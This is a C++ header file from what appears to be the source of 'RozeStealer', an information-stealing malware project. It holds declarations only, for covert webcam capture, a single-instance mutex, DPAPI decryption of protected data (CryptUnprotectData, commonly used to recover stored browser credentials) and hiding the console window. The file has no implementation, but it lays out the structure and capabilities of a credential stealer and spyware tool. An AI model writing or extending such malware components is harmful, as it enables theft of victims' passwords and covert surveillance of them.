#ifndef ROZE_STEALER_SYSCALLS_H
#define ROZE_STEALER_SYSCALLS_H

#include <string>
#include <vector>
#include <windows.h>

namespace RozeStealer {

class Syscalls {
public:
    static bool captureWebcam(int index, const std::string& filePath);
    static bool createMutex(const std::string& mutexName);
    static std::vector<unsigned char> cryptUnprotectData(const std::vector<unsigned char>& encryptedData, const std::string& optionalEntropy = "");
    static void hideConsole();
};

} // namespace RozeStealer

#endif // ROZE_STEALER_SYSCALLS_H


